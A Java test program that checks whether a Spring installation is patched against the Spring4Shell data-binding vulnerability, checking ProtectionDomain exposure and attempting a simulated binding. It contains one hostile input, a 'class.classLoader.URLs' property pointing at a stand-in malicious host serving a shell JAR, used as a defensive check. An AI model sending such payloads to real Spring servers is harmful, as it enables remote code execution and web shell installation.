import org.springframework.beans.BeanWrapper;
import org.springframework.beans.BeanWrapperImpl;
import org.springframework.beans.MutablePropertyValues;

public class VerifySpring4ShellDeep {
	public static void main(String[] args) {
		System.out.println("--- Starting Spring4Shell Deep Binding Verification ---");

		// Dummy object simulating a web form
		class UserData {
			private String name = "DefaultUser";
			public String getName() { return name; }
			public void setName(String name) { this.name = name; }
		}

		UserData user = new UserData();
		BeanWrapper wrapper = new BeanWrapperImpl(user);

		// TEST 1: Check the secondary gadget chain (ProtectionDomain)
		boolean pdExposed = wrapper.isReadableProperty("class.protectionDomain");
		System.out.println("[Test 1] Is 'class.protectionDomain' exposed? " + pdExposed);

		// TEST 2: Simulate a malicious web payload (Data Binding)
		System.out.println("\n[Test 2] Simulating malicious HTTP POST Data Binding attack...");
		MutablePropertyValues pvs = new MutablePropertyValues();

		// The attacker payload attempting to drop a web shell
		pvs.add("class.classLoader.URLs[0]", "http://malicious-server/shell.jar");
		// A legitimate property sent in the same request
		pvs.add("name", "HackedName");

		try {
			// Spring MVC DataBinder usually ignores invalid properties silently (ignoreUnknown=true)
			wrapper.setPropertyValues(pvs, true, true);

			System.out.println("[Result] Binding process finished.");
			System.out.println("[Result] User name is now: " + user.getName());

			if (!pdExposed) {
				System.out.println("\n[PASSED] ProtectionDomain is blocked. The full patch is active!");
				System.out.println("[PASSED] Malicious payload was safely absorbed and ignored without traversing the ClassLoader!");
			}
		} catch (Exception e) {
			System.out.println("[Result] Spring forcefully rejected the payload: " + e.getMessage());
			System.out.println("\n[PASSED] The injection was completely blocked!");
		}
	}
}